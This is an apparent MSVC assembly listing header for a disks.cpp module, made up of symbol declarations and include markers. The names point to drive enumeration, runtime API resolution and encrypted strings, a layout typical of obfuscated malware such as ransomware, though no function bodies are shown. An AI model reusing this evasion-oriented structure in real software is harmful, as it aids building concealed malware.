; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__016BD130_queue@h DB 01H
__3106C9CE_memory@h DB 01H
__93890D6E_filesystem@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__ED66B863_memory@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__457AF2B3_logs@h DB 01H
__80D02333_disks@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??0drive_info_@filesystem@@QEAA@XZ		; filesystem::drive_info_::drive_info_
PUBLIC	?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ; filesystem::EnumirateDrives
PUBLIC	?plstrlenW@@YAHPEB_W@Z				; plstrlenW
PUBLIC	?pGetLogicalDriveStringsW@@YAKKPEA_W@Z		; pGetLogicalDriveStringsW
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Convert_size@_K_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64,unsigned __int64>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	__JustMyCode_Default
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_C@_1CE@KFOFEHDF@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AA?$CF?$AAd?$AA?5?$AAd?$AAr?$AAi?$AAv?$AAe?$AAs@ ; `string'
PUBLIC	??_C@_15GANGMFKL@?$AA?$CF?$AAs@			; `string'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	??2@YAPEAX_K@Z:PROC				; operator new
EXTRN	??3@YAXPEAX_K@Z:PROC				; operator delete
EXTRN	_invalid_parameter_noinfo_noreturn:PROC
EXTRN	memcpy:PROC
EXTRN	memmove:PROC
EXTRN	wcslen:PROC
EXTRN	free:PROC
EXTRN	__std_exception_copy:PROC
EXTRN	__std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	?_Xlength_error@std@@YAXPEBD@Z:PROC		; std::_Xlength_error
